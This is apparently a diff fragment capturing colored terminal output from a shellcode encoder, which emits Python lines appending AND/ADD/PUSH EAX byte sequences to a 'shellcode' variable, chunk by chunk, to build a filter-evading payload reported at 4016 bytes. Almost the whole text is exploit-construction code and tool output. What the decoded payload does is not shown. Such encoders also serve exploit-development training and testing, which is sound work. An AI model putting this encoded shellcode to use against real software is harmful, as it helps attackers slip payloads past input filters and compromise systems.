+shellcode += "[37m\x05\x20\x11\x20\x21[0m" ## add  eax, 0x21201120
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [41416b41]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x21\x36\x21\x21[0m" ## add  eax, 0x21213621
+shellcode += "[37m\x05\x20\x35\x20\x20[0m" ## add  eax, 0x20203520
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [30413050]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x30\x20\x21\x20[0m" ## add  eax, 0x20212030
+shellcode += "[37m\x05\x20\x10\x20\x10[0m" ## add  eax, 0x10201020
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [58416a5a]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x35\x35\x21\x34[0m" ## add  eax, 0x34213535
+shellcode += "[37m\x05\x25\x35\x20\x24[0m" ## add  eax, 0x24203525
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [51374949]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x25\x25\x23\x31[0m" ## add  eax, 0x31232525
+shellcode += "[37m\x05\x24\x24\x14\x20[0m" ## add  eax, 0x20142424
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [49494949]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x25\x25\x25\x25[0m" ## add  eax, 0x25252525
+shellcode += "[37m\x05\x24\x24\x24\x24[0m" ## add  eax, 0x24242424
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [49494949]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x25\x25\x25\x25[0m" ## add  eax, 0x25252525
+shellcode += "[37m\x05\x24\x24\x24\x24[0m" ## add  eax, 0x24242424
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [49494949]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x25\x25\x25\x25[0m" ## add  eax, 0x25252525
+shellcode += "[37m\x05\x24\x24\x24\x24[0m" ## add  eax, 0x24242424
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [49495954]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x32\x35\x25\x25[0m" ## add  eax, 0x25253532
+shellcode += "[37m\x05\x22\x24\x24\x24[0m" ## add  eax, 0x24242422
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Shellcode final size: 4016 bytes
